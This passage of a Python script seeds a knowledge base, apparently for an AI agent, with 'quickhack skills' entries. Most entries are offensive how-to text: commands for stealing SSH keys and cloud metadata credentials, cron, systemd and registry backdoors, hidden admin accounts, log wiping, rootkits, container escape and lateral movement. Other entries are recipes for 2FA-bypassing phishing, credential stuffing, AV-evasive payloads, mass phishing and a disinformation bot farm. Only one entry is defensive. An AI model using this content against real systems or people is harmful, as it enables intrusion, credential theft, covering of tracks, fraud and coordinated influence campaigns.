        "cat ~/.ssh/id_rsa and id_rsa.pub. Also check ~/.ssh/config for hosts, authorized_keys for persistence. Use stolen keys for lateral movement.",
        ["post-exploitation", "ssh", "keys"],
    ),
    (
        "History Mining bash PowerShell commands",
        "Linux: ~/.bash_history, ~/.zsh_history. Windows: Get-Content (Get-PSReadlineOption).HistorySavePath. Extract commands revealing other systems, credentials, and infrastructure.",
        ["post-exploitation", "history", "recon"],
    ),
    (
        "File Exfiltration steal documents data",
        "rsync -avz source/ user@remote:/dest/ for bulk. HTTP POST for small payloads. DNS exfil for stealth. Encrypt before sending to avoid detection.",
        ["post-exploitation", "exfiltration", "data"],
    ),
    (
        "Cron Persistence scheduled task backdoor",
        "echo '* * * * * /tmp/backdoor.sh' >> /etc/crontab or user crontab -e. Check cron.d, cron.hourly/daily/weekly. Use @reboot for startup execution.",
        ["post-exploitation", "persistence", "cron"],
    ),
    (
        "Systemd Persistence malicious service",
        "Create /etc/systemd/system/backdoor.service with ExecStart pointing to backdoor. systemctl enable backdoor, systemctl start backdoor. Survives reboot with proper dependencies.",
        ["post-exploitation", "persistence", "systemd"],
    ),
    (
        "Registry Persistence Run keys Windows",
        "Add value to HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run or HKCU variant. Also check RunOnce, Startup folder, and Scheduled Tasks Library.",
        ["post-exploitation", "persistence", "registry"],
    ),
    (
        "SSH Lateral Movement stolen keys",
        "Use stolen SSH keys: ssh user@other-host. Test each key against all discovered hosts. Add -o StrictHostKeyChecking=no for automation. ProxyJump through multiple hops.",
        ["post-exploitation", "lateral", "ssh"],
    ),
    (
        "WinRM Lateral Movement evil-winrm",
        "evil-winrm -i target -u user -p pass provides PowerShell remoting session. Upload/download files, execute commands, run BloodHound, dump hashes.",
        ["post-exploitation", "lateral", "winrm"],
    ),
    (
        "PsExec Lateral Movement impacket",
        "impacket-psexec domain/user@target executes commands via SMB. Also wmiexec.py, smbexec.py, dcomexec.py for different lateral movement variations.",
        ["post-exploitation", "lateral", "psexec"],
    ),
    (
        "RDP Lateral Movement xfreerdp rdesktop",
        "xfreerdp /v:target /u:user /p:pass /size:800x600 gives remote desktop. Use /cert:ignore for self-signed certs. RDP sessions can bypass network segmentation.",
        ["post-exploitation", "lateral", "rdp"],
    ),
    (
        "SCP Lateral Movement copy tools",
        "scp exploit.elf user@target:/tmp/ copies tools to compromised host. Automate bulk deployment of persistence, keyloggers, and exfiltration scripts across discovered hosts.",
        ["post-exploitation", "lateral", "scp"],
    ),
    (
        "Port Forwarding chisel tunnel pivot",
        "chisel server -p 8080 -reverse on attacker. chisel client victim:8080 R:8000:localhost:80 on target. Creates tunnel through firewalls for local service access.",
        ["post-exploitation", "tunneling", "pivot"],
    ),
    (
        "SOCKS Proxy route traffic through victim",
        "ssh -D 1080 user@target creates SOCKS5 proxy. Configure proxychains: socks5 127.0.0.1 1080. Route nmap, sqlmap, etc through compromised host.",
        ["post-exploitation", "proxy", "pivot"],
    ),
    (
        "Linux Privilege Escalation kernel exploit SUID",
        "Check: sudo -l, find / -perm -4000 -type f, uname -a for kernel exploits. LinPEAS automates enumeration. DirtyPipe, PwnKit, CVE-2021-4034 are reliable escalation vectors.",
        ["post-exploitation", "privesc", "linux"],
    ),
    (
        "Windows Privilege Escalation winPEAS potato",
        "winPEAS enumerates all privesc vectors. JuicyPotato/RoguePotato/GodPotato exploit SeImpersonate privilege. AlwaysInstallElevated, unquoted service paths, vulnerable drivers.",
        ["post-exploitation", "privesc", "windows"],
    ),
    (
        "Log Cleaning remove traces",
        "Linux: rm -rf /var/log/auth.log /var/log/syslog, shred /var/log/wtmp. Windows: wevtutil cl System, wevtutil cl Security, wevtutil cl Application. Clear event logs completely.",
        ["post-exploitation", "evasion", "log-cleaning"],
    ),
    (
        "Timestomping backdoor file timestamps",
        "touch -r legitimate_file backdoor matches backdoor timestamps to a legitimate file. Use -t for specific date: touch -t 202301011200.00 file.",
        ["post-exploitation", "evasion", "timestamps"],
    ),
    (
        "Process Injection hide in legitimate process",
        "Meterpreter: migrate to explorer.exe. Manual: CreateRemoteThread with VirtualAllocEx in target process. Tools: msfvenom shellcode + custom injector, Cobalt Strike execute-assembly.",
        ["post-exploitation", "evasion", "process-injection"],
    ),
    (
        "Rootkit Install kernel module hide",
        "Linux: Diamorphine LKM hides processes, files, and modules. load with insmod. Windows: direct kernel object manipulation or driver-based rootkits for total process hiding.",
        ["post-exploitation", "rootkit", "stealth"],
    ),
    (
        "Backdoor User create hidden account",
        "Linux: useradd -m backdoor; echo 'backdoor:password' | chpasswd. Windows: net user backdoor password /add; net localgroup administrators backdoor /add. Hide from login screen via registry.",
        ["post-exploitation", "persistence", "user"],
    ),

    # ═══════════════════════════════════════════════════════════════
    # PART 8: CLOUD PIVOTING AND CONTAINER ESCAPE
    # ═══════════════════════════════════════════════════════════════

    (
        "Container Escape privileged host access",
        "Privileged containers have all capabilities: mount /dev/sda1 /mnt, chroot /mnt, access host filesystem. Docker run --privileged sleep 1 && nsenter --target 1 --mount --uts --ipc --net --pid -- bash.",
        ["container", "escape", "docker"],
    ),
    (
        "Kubernetes Secrets Dump cluster secrets",
        "kubectl get secrets --all-namespaces -o yaml dumps all secrets. Decode base64 values. Most clusters have at least one secret with admin credentials.",
        ["container", "kubernetes", "secrets"],
    ),
    (
        "Pod HostPath Mount host filesystem read",
        "Pods with hostPath volume mounts can read/write host filesystem. Check: kubectl get pods -o yaml | grep hostPath. Mount /host and access everything.",
        ["container", "kubernetes", "hostpath"],
    ),
    (
        "Kubelet API Exploit unauthenticated commands",
        "Kubelet API on port 10250 often exposed without auth. POST /run/namespace/pod/container with command executes in any pod. Full cluster escape without credentials.",
        ["container", "kubernetes", "kubelet"],
    ),
    (
        "EC2 Metadata Pivot IAM credential steal",
        "From compromised EC2: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE extracts temporary IAM credentials for cloud API access.",
        ["container", "aws", "metadata"],
    ),
    (
        "GCP Metadata Pivot service account token",
        "From GCP VM: curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token gets OAuth2 token for GCP API.",
        ["container", "gcp", "metadata"],
    ),
    (
        "Azure Metadata Pivot managed identity token",
        "From Azure VM: curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ extracts Azure resource token.",
        ["container", "azure", "metadata"],
    ),
    (
        "EKS Cluster Takeover kubectl with role",
        "aws eks update-kubeconfig --name cluster --role-arn arn:aws:iam::acct:role/role with stolen AWS credentials gives kubectl access to the EKS cluster.",
        ["container", "aws", "eks"],
    ),
    (
        "Container Registry Poison push malicious image",
        "Push malicious container image to ECR/GCR/ACR with compromised creds. Tag as latest. Applications auto-pulling from registry get backdoored images.",
        ["container", "registry", "poison"],
    ),
    (
        "Orchestrator Pivot pod to cluster admin",
        "Compromised pod -> metadata API -> cloud credentials -> kubernetes API -> delete all pods. One misconfigured pod can lead to total cluster compromise.",
        ["container", "pivot", "orchestrator"],
    ),

    # ═══════════════════════════════════════════════════════════════
    # PART 9: THE WATCH DOGS CRAFTING TABLE
    # ═══════════════════════════════════════════════════════════════

    (
        "Auto Phisher clone site email LLM logger",
        "Combine evilginx2 + GoPhish + LLM. Evilginx2 reverse-proxies login pages bypassing 2FA. GoPhish sends campaigns. LLM generates personalized emails for each target.",
        ["crafting", "phishing", "automation"],
    ),
    (
        "OSINT Dashboard unified web UI recon",
        "Combine theHarvester + Sherlock + Recon-ng + SpiderFoot into a single web interface. Automate person/corp research with one click. Output to JSON/HTML report.",
        ["crafting", "osint", "dashboard"],
    ),
    (
        "Vuln Pipeline auto scan chain exploit",
        "Pipe Nmap into Nuclei into FFUF. Auto-discover hosts, fingerprint services, run vulnerability templates, fuzz for hidden endpoints. Chain findings into exploit sequence.",
        ["crafting", "pipeline", "automation"],
    ),
    (
        "Credential Recycler breach data tester",
        "OpenBullet 2 + proxy scraper + parsed breach data. Auto-tests stolen credential pairs against 50+ victim sites. Log successful logins for account takeover chain.",
        ["crafting", "credential-stuffing", "recycling"],
    ),
    (
        "Backdoor Generator undetectable payload",
        "MSFVenom + Python obfuscator + UPX packer. Generate payload variations automatically. Test each against VirusTotal API. Iterate until detection rate is acceptable.",
        ["crafting", "backdoor", "generator"],
    ),
    (
        "Log Cleaner Wiper forensic evasion",
        "Sed + shred + wipe-free-space script. Overwrite auth logs, shell history, temp files, and swap space. Use sdelete (Windows) or wipe (Linux) for DoD-standard cleanup.",
        ["crafting", "evasion", "cleanup"],
    ),
    (
        "C2 Listener command and control server",
        "Covenant (C#), Sliver (Go), or Empire (PowerShell). Open source C2 frameworks with staging, encrypted comms, module loading, and multiple transport protocols.",
        ["crafting", "c2", "framework"],
    ),
    (
        "Report Generator pentest output formatter",
        "Jinja2 + Markdown + HTML template renders scan and exploit results into professional reports. Include CVSS scores, screenshots, evidence, and remediation.",
        ["crafting", "reporting", "automation"],
    ),
    (
        "Mass Emailer personalized phishing scale",
        "SMTP server + proxy rotator + LLM generator. Send 10,000 personalized phishing emails with unique tracking, different sender addresses, and varied templates.",
        ["crafting", "phishing", "mass"],
    ),
    (
        "Credential Monitor breach alert watcher",
        "HaveIBeenPwned API + custom database + notification system. Watch for new breach data mentioning target emails. Alert immediately when new credentials are leaked.",
        ["crafting", "monitoring", "breach"],
    ),
    (
        "Dynamic Payload AV evasion download",
        "Python + AWS Lambda generates unique payload binary per download. Rotates encryption keys, packers, and obfuscation per request. Each download gets a new hash.",
        ["crafting", "payload", "av-evasion"],
    ),
    (
        "Recon Automator daily OSINT scheduler",
        "Bash + Python + GitHub Actions runs daily recon on targets. Email report of new findings: new subdomains, open ports, breached credentials, technology changes.",
        ["crafting", "automation", "schedule"],
    ),
    (
        "Twitter Bot Farm coordinated influence",
        "Tweepy + LLM + proxy pool manages 100+ automated accounts. Post as fake personas, amplify narratives, attack targets. Each bot has unique writing style and history.",
        ["crafting", "bots", "disinformation"],
    ),
    (
        "DNS Tunneler data exfiltration stealth",
        "iodine or dnscat2 tunnels TCP traffic through DNS queries. Exfiltrate data from restrictive networks where only DNS is allowed. Hard to detect at network edge.",
        ["crafting", "tunneling", "dns"],
    ),
    (
        "ICMP Tunneler covert channel ping",
        "ptunnel or icmptx tunnels TCP through ICMP echo packets. Useful when TCP/UDP is blocked but ping is allowed. Low bandwidth but very stealthy.",
        ["crafting", "tunneling", "icmp"],
    ),
    (
        "HTTP C2 Proxy hide command traffic",
        "pivotnacci or similar tools hide C2 traffic in legitimate-looking HTTP requests. Blend in with normal web traffic using common paths and intervals.",
        ["crafting", "c2", "proxy"],
    ),
    (
        "Session Swapper cookie session takeover",
        "Browser extension or custom tool that injects stolen cookies into local browser. One-click session takeover: click a URL and instantly become the victim on target site.",
        ["crafting", "session", "takeover"],
    ),
    (
        "Automated Bug Hunter zero day discovery",
        "Nuclei + custom fuzzing templates constantly testing for new vulnerabilities in common web applications. Automate CVE discovery and POC generation.",
        ["crafting", "bug-bounty", "zeroday"],
    ),
    (
        "Dark Web Monitor onion site alert system",
        "Tor + Python + RSS feed monitor. Watch for target mentions in dark web forums, paste sites, and marketplaces. Alert on credential dumps and planning discussions.",
        ["crafting", "darkweb", "monitoring"],
    ),
    (
        "Breach Simulator defense testing framework",
        "Caldera or Atomic Red Team runs MITRE ATT&CK mapped adversary simulations. Test your detection and response without real malware. Train your team safely.",
        ["crafting", "simulation", "defense"],
    ),
]

for kb_dir in KB_DIRS:
    if kb_dir.exists():
        shutil.rmtree(kb_dir)
    kb_dir.mkdir(parents=True, exist_ok=True)
    kb = KnowledgeBase(kb_dir)
    for topic, content, tags in entries:
        kb.add("knowledge", topic, content, "", tags)
    n = kb.stats()["total_entries"]
    print(f"  {kb_dir} -> {n} entries")

print(f"\nSeeded {len(entries)} quickhack skills in {len(KB_DIRS)} locations.")
